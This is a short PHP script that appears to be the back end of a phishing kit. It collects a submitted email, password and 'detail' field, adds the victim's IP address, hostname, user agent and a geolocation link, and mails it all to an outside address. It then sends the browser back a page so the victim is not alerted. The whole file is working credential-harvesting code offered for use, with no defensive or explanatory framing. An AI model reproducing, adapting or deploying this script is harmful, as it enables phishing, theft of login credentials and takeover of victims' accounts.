<?php
$email = trim($_POST['email']);
$password = trim($_POST['passwd']);
$detail = trim($_POST['detail']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "Login From           : ".$detail."\n";
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = " tydbni@telegmail.com";
	$subject = "Login : $ip";
    mail($send, $subject, $message);



	// $praga=rand();
	// $praga=md5($praga);
}

echo "<script>
              
             window.history.go(-1);
     </script>";


?>
